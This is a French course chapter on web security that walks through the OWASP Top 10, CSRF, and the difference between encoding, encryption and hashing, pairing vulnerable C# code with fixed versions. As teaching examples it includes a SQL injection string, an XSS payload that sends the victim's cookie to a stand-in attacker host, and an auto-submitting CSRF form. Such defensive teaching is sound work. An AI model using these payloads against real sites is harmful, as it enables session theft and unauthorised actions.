## 14. Synthèse sécurité : l'OWASP Top 10

L'**OWASP** (*Open Web Application Security Project*) est une organisation qui publie des ressources sur la sécurité des applications web. Son **Top 10** recense les risques les plus critiques — c'est la référence mondiale pour les développeurs.

La sécurité n'est pas une fonctionnalité qu'on ajoute à la fin : elle se construit à chaque étape du développement. Le principe de **défense en profondeur** signifie qu'on ne compte pas sur une seule protection — on en empile plusieurs, de sorte que si l'une est contournée, les autres tiennent.

---

### Les trois piliers de la sécurité — la triade CIA

Chaque mesure de sécurité vise à protéger l'un de ces trois axes :

| Pilier | Définition | Exemple de violation |
| --- | --- | --- |
| **C**onfidentialité | Seuls les autorisés accèdent aux données | Un salarié lit les demandes d'un collègue |
| **I**ntégrité | Les données ne sont pas modifiées sans autorisation | Un utilisateur modifie son solde de congés directement en base |
| **D**isponibilité | Le service reste accessible quand on en a besoin | Une attaque DDoS rend l'application inaccessible |

---

### A01 — Broken Access Control (Contrôle d'accès défaillant)

**C'est le risque n°1 depuis 2021.** Un utilisateur authentifié accède à des ressources qui ne lui appartiennent pas.

**Exemple d'attaque :**
```
GET /api/demandes/42
```
Si l'API retourne la demande n°42 sans vérifier que l'utilisateur connecté en est bien le propriétaire, n'importe quel salarié peut voir les demandes de tous les autres en changeant l'id dans l'URL.

**Comment s'en protéger :**
```csharp
// ❌ Vulnérable : retourne la demande sans vérification
public IActionResult Get(int id) => Ok(_repo.GetParId(id));

// ✅ Protégé : vérifie que la demande appartient à l'utilisateur connecté
public IActionResult Get(int id)
{
    var demande = _repo.GetParId(id);
    if (demande is null) return NotFound();

    int idConnecte = int.Parse(User.FindFirst("sub")!.Value);
    if (demande.IdSalarie != idConnecte) return Forbid(); // 403

    return Ok(demande);
}
```

**Règle :** toujours vérifier les droits côté serveur, à chaque requête. Ne jamais se fier au client.

---

### A02 — Cryptographic Failures (Défaillances cryptographiques)

Des données sensibles sont exposées faute de chiffrement adéquat.

**Exemples de violations :**
- Mot de passe stocké en clair en base : si la base est volée, tous les comptes sont compromis
- Communication HTTP (non HTTPS) : le mot de passe transite en clair sur le réseau
- Utilisation de MD5 ou SHA-1 pour hacher les mots de passe : trop rapides, cassables par brute force

**Comment s'en protéger :**
- **HTTPS** sur toutes les communications (Let's Encrypt, certificat TLS)
- **Hachage lent** des mots de passe : bcrypt, Argon2, PBKDF2 — avec un sel unique par utilisateur

```csharp
// ❌ Ne jamais faire ça
string hashMd5 = MD5.HashData(Encoding.UTF8.GetBytes(motDePasse)).ToString();

// ✅ Hachage avec BCrypt (lent = résistant au brute force)
string hash = BCrypt.Net.BCrypt.HashPassword(motDePasse);
bool ok     = BCrypt.Net.BCrypt.Verify(saisie, hashStocke);
```

---

### A03 — Injection

Du code malveillant est injecté via les entrées utilisateur et exécuté par le serveur.

**Exemple d'attaque SQL :**
```
Saisie : ' OR '1'='1
Requête construite : SELECT * FROM Salarie WHERE email = '' OR '1'='1'
→ Retourne TOUS les salariés sans vérification de mot de passe
```

**Comment s'en protéger :**
```csharp
// ❌ Vulnérable : concaténation directe
string sql = "SELECT * FROM Salarie WHERE email = '" + emailSaisi + "'";

// ✅ Requête paramétrée : la saisie est traitée comme une valeur, jamais comme du code
string sql = "SELECT * FROM Salarie WHERE email = @email";
cmd.Parameters.AddWithValue("@email", emailSaisi);
```

Un ORM comme Entity Framework Core paramètre automatiquement toutes les requêtes.

**Le XSS fait partie d'A03 depuis 2021.** L'injection ne se limite pas au SQL : injecter du JavaScript dans une page est le même mécanisme, avec un autre interpréteur.

**XSS — Cross-Site Scripting**

L'attaquant place du code JavaScript dans une donnée ; le navigateur d'une autre victime l'exécute comme s'il venait du site.

| Type | Où vit la charge | Exemple |
| --- | --- | --- |
| **Stocké** (persistant) | En base — servi à tous les visiteurs | Un commentaire contenant `<script>` ; chaque lecteur est touché |
| **Réfléchi** | Dans l'URL — renvoyé tel quel dans la réponse | `?recherche=<script>…</script>` dans un lien piégé envoyé par e-mail |
| **DOM** | Uniquement côté client, sans passer par le serveur | Du JS qui écrit `location.hash` dans `innerHTML` |

```javascript
// L'attaquant saisit ceci comme motif de sa demande de congé :
<img src=x onerror="fetch('https://attaquant.fr/vol?c='+document.cookie)">

// ❌ Vulnérable : le motif est injecté comme du HTML
zone.innerHTML = demande.motif;   // → le navigateur exécute onerror

// ✅ Protégé : le motif est traité comme du texte
zone.textContent = demande.motif; // → affiche les balises littéralement
```

**Les trois lignes de défense contre le XSS :**

1. **Échapper en sortie** — c'est la protection principale. `textContent` côté JavaScript ; Razor (`@model.Motif`) et les frameworks modernes (React, Vue, Angular) échappent par défaut. La faille revient dès qu'on force le passage : `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `@Html.Raw`.
2. **Valider en entrée** — refuser ce qui n'a rien à faire là, et si du HTML riche est réellement nécessaire, le nettoyer avec une bibliothèque dédiée (DOMPurify, HtmlSanitizer) plutôt qu'avec une expression régulière maison.
3. **Content-Security-Policy** — un en-tête qui interdit au navigateur d'exécuter du script en ligne. C'est le filet quand les deux premières défenses ont laissé passer quelque chose.

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'" always;
```

**Pourquoi c'est grave :** un XSS réussi s'exécute avec les droits de la victime. Il peut voler la session, effectuer des actions en son nom, ou réécrire la page pour capturer un mot de passe. Un cookie `HttpOnly` empêche au moins de voler le jeton en JavaScript.

---

### A04 — Insecure Design (Conception non sécurisée)

Des failles existent dans la conception même de l'application, pas juste dans le code.

**Exemple :** un système de réinitialisation de mot de passe qui envoie le nouveau mot de passe par SMS peut être contourné si l'attaquant contrôle le numéro. La faille est dans la conception, pas dans le code.

**Comment s'en protéger :**
- Penser à la sécurité dès la phase d'analyse (Privacy by Design)
- Faire une **modélisation des menaces** : "qui pourrait abuser de cette fonctionnalité ?"
- Définir les rôles et habilitations avant de coder

---

### A05 — Security Misconfiguration (Mauvaise configuration)

L'application est correctement codée mais mal configurée.

**Exemples courants :**
- Mode debug activé en production → stack trace visible par tout le monde
- Comptes par défaut non changés (admin/admin)
- Ports inutiles ouverts sur le serveur
- Headers de sécurité manquants dans Nginx

**Comment s'en protéger :**
```nginx
# Headers de sécurité Nginx
add_header Strict-Transport-Security "max-age=31536000" always;
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options DENY;
add_header Content-Security-Policy "default-src 'self'";
```

```csharp
// Désactiver les détails d'erreur en production
if (!app.Environment.IsDevelopment())
    app.UseExceptionHandler("/error"); // message générique, pas de stack trace
```

---

### A06 — Vulnerable and Outdated Components (Composants vulnérables)

L'application utilise des librairies avec des failles connues (CVE).

**Comment s'en protéger :**
```bash
npm audit                                    # scan des dépendances Node.js
dotnet list package --vulnerable             # scan des dépendances .NET
```

Activer **Dependabot** sur GitHub : il ouvre automatiquement des Pull Requests quand une dépendance a une vulnérabilité connue.

---

### A07 — Identification and Authentication Failures

Mots de passe faibles, absence de protection contre le brute force, sessions mal gérées.

**Exemples de violations :**
- Pas de limite sur les tentatives de connexion → brute force possible
- Tokens JWT qui n'expirent jamais
- Mots de passe trop simples acceptés

**Comment s'en protéger :**
- **fail2ban** sur le serveur (bannit les IP après N échecs)
- **Rate limiting** sur les endpoints d'authentification
- Expiration courte des tokens JWT (60 min) avec refresh token
- Exiger des mots de passe forts via validation (regex)

---

### A08 — Software and Data Integrity Failures

La chaîne de livraison (pipeline CI/CD) ou les données peuvent être altérées.

**Exemple :** si un attaquant peut pousser du code directement sur `main` sans revue, il peut injecter du code malveillant en production.

**Comment s'en protéger :**
- Protéger la branche `main` : PR obligatoire + CI verte avant merge
- Signer les images Docker et vérifier leur intégrité
- Stocker les secrets dans GitHub Secrets, pas dans le code

---

### A09 — Security Logging and Monitoring Failures

Les événements de sécurité ne sont pas journalisés, ou pas surveillés.

**Conséquence :** une attaque peut durer des semaines sans être détectée.

**Ce qu'il faut logger :**
- Les tentatives de connexion échouées (avec l'IP source)
- Les accès refusés (403)
- Les modifications de données sensibles
- Les erreurs inhabituelles (pics d'erreurs 500)

**Ce qu'il ne faut PAS logger :**
- Mots de passe, même hachés
- Tokens JWT
- Données personnelles sensibles

---

### A10 — Server-Side Request Forgery (SSRF)

L'attaquant fait envoyer une requête HTTP par le serveur vers une URL qu'il contrôle — souvent pour atteindre des ressources internes.

**Exemple :** une fonctionnalité "import depuis URL" qui accepte `http://localhost:5432` pourrait permettre à l'attaquant d'interagir avec la base de données interne.

**Comment s'en protéger :**
- Valider et filtrer les URLs acceptées en entrée
- Interdire les adresses IP privées (10.x.x.x, 192.168.x.x, localhost)
- Ne jamais faire confiance à une URL fournie par l'utilisateur

---

### 14.1 Le cas des mots de passe — récapitulatif

| Méthode | Sécurité | Pourquoi |
| --- | --- | --- |
| Stockage en clair | ❌ Catastrophique | Vol de base = tous les comptes compromis |
| Chiffrement réversible (AES) | ❌ Mauvais | Réversible = peut être déchiffré si la clé est volée |
| MD5 / SHA-1 | ❌ Insuffisant | Trop rapides : millions de tentatives/seconde possibles |
| bcrypt / Argon2 | ✅ Recommandé | Lents par conception + sel unique = résistants au brute force |

---

### 14.2 CSRF — Cross-Site Request Forgery

Le CSRF est l'inverse exact du XSS : au lieu d'exécuter du code de l'attaquant sur le site légitime, il fait exécuter une **action légitime** par la victime, à son insu, depuis un site tiers.

**Le mécanisme :**

```
1. Valentin se connecte à congeapp.fr — le navigateur stocke son cookie de session.
2. Sans se déconnecter, il visite un site piégé.
3. Ce site contient :

   <form action="https://congeapp.fr/api/demandes/42/valider" method="POST" id="f">
     <input type="hidden" name="statut" value="VALIDEE">
   </form>
   <script>document.getElementById('f').submit();</script>

4. Le navigateur envoie la requête vers congeapp.fr AVEC le cookie de session
   (il l'attache automatiquement à toute requête vers ce domaine).
5. Côté serveur, la requête est parfaitement authentifiée. La demande est validée.
```

L'attaquant n'a pas eu accès au cookie — il n'en a pas eu besoin. Il a simplement profité du fait que **le navigateur joint les cookies tout seul**.

**Les trois protections :**

| Protection | Comment ça marche |
| --- | --- |
| **Jeton anti-CSRF** | Le serveur place un jeton aléatoire dans le formulaire et le vérifie à la soumission. Le site tiers ne peut ni le deviner, ni le lire (politique de même origine). |
| **`SameSite` sur le cookie** | `SameSite=Strict` ou `Lax` empêche le navigateur d'envoyer le cookie sur une requête venue d'un autre site. Défense par défaut des navigateurs modernes. |
| **En-tête `Authorization`** | Un jeton JWT envoyé dans un en-tête n'est **pas** attaché automatiquement par le navigateur : le code de l'attaquant devrait le lire, ce que la politique de même origine interdit. |

```csharp
// ASP.NET Core : jeton anti-CSRF sur les actions sensibles
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult Valider(int id) { /* ... */ }

// Et sur le cookie de session
options.Cookie.SameSite     = SameSiteMode.Strict;
options.Cookie.HttpOnly     = true;
options.Cookie.SecurePolicy = CookieSecurePolicy.Always;
```

**Le tableau qui résume XSS et CSRF — la question piège du jury :**

| | **XSS** | **CSRF** |
| --- | --- | --- |
| Ce qui est injecté | Du code de l'attaquant | Une requête légitime |
| Qui est trompé | Le **navigateur** de la victime | Le **serveur** |
| Vecteur | Une donnée non échappée à l'affichage | L'envoi automatique du cookie |
| Défense principale | Échappement en sortie + CSP | Jeton anti-CSRF + `SameSite` |
| Le `HttpOnly` aide ? | Oui — le cookie devient illisible en JS | Non — le cookie part quand même |

> Un XSS réussi contourne les protections CSRF : le code s'exécute sur le site lui-même, il peut donc lire le jeton anti-CSRF. C'est pour ça que le XSS est considéré comme le plus grave des deux.

---

### 14.3 Chiffrement, hachage, encodage — trois choses différentes

Confusion fréquente, et question quasi systématique à l'oral.

| Opération | Réversible ? | À quoi ça sert | Exemples |
| --- | --- | --- | --- |
| **Encodage** | Oui, sans clé | Transporter une donnée dans un format compatible. **Aucune sécurité.** | base64, URL-encoding |
| **Chiffrement** | Oui, avec la clé | Rendre une donnée illisible pour qui n'a pas la clé | AES, RSA |
| **Hachage** | Non | Vérifier sans stocker l'original, contrôler l'intégrité | bcrypt, Argon2, SHA-256 |

Le payload d'un JWT est **encodé** en base64, pas chiffré : n'importe qui peut le lire. La signature garantit qu'il n'a pas été modifié, pas qu'il est secret.

**Symétrique ou asymétrique :**

| | **Symétrique** | **Asymétrique** |
| --- | --- | --- |
| Clés | Une seule, partagée | Une paire : publique + privée |
| Vitesse | Rapide | Lent |
| Problème | Comment transmettre la clé sans qu'elle soit interceptée | Aucun échange de secret nécessaire |
| Algorithmes | AES | RSA, ECDSA |
| Usage | Chiffrer un gros volume de données | Échanger une clé, signer |

**HTTPS combine les deux** — c'est l'exemple à donner : la poignée de main TLS utilise l'asymétrique pour authentifier le serveur (son certificat) et se mettre d'accord sur une clé de session ; toute la suite de la conversation est chiffrée en symétrique, parce que c'est bien plus rapide.

**Et le certificat TLS ?** C'est une clé publique signée par une autorité de certification (Let's Encrypt, par exemple). Le navigateur fait confiance à l'autorité, donc au certificat, donc au serveur.

---

> **📌 À retenir**
>
> La sécurité est une responsabilité transversale : elle commence à l'analyse des besoins (définir les rôles), continue dans la conception (modélisation des menaces), s'applique dans le code (validation, paramétrage, hachage) et se maintient en production (monitoring, mises à jour). Aucune couche seule ne suffit — c'est la **défense en profondeur**.
